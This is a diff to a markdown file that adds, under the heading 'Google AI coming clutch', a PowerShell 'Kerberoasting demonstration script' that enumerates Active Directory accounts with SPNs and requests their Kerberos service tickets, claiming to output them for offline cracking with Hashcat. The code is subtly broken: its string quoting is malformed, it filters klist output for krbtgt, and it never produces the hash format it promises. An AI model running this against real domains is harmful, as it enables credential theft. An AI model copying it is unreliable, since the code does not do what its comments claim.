@@ -239,3 +239,63 @@ Select SamAccountName,PasswordLastSet,PasswordNeverExpires,
 @{N="SPNs";E={$_.ServicePrincipalName -join "; "}} |
 Format-List
 ```
+
+
+
+# Google AI coming clutch
+
+
+```
+<#
+.SYNOPSIS
+    Kerberoasting demonstration script — enumerates SPNs and requests Kerberos tickets.
+    Outputs tickets in Hashcat format for offline cracking.
+
+.NOTES
+    Author: Security Demo
+    Requires: Domain-joined machine, PowerShell 5+, ActiveDirectory module
+    Run with: Authorized account that can query AD
+#>
+
+Import-Module ActiveDirectory -ErrorAction Stop
+
+function Get-KerberoastTickets {
+    param(
+        [string]$Domain = $env:USERDOMAIN
+    )
+
+    # Enumerate all user accounts with SPNs
+    $users = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
+
+    foreach ($user in $users) {
+        foreach ($spn in $user.ServicePrincipalName) {
+            try {
+                Write-Host "[+] Requesting ticket for SPN: $spn" -ForegroundColor Cyan
+
+                # Request the ticket using built-in API
+                $ticket = New-Object System.Net.NetworkCredential("", "", $Domain)
+                $null = klist purge
+
+                # Use cmd.exe to request ticket (safe method)
+                $cmd = "powershell -Command `"Add-Type -AssemblyName System.IdentityModel; " +
+                       "`$cred = New-Object System.Net.NetworkCredential('',$null,'$Domain');`" +
+                       "`$ctx = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken('$spn');`" +
+                       "`Write-Output `$ctx`" 
+                Invoke-Expression $cmd
+
+                # Dump tickets in hashcat format
+                klist | Select-String "krbtgt" | ForEach-Object {
+                    Write-Host "[*] Ticket info: $_"
+                }
+            }
+            catch {
+                Write-Warning "Failed to request ticket for $spn: $_"
+            }
+        }
+    }
+}
+
+# Run the function
+Get-KerberoastTickets
+```
+
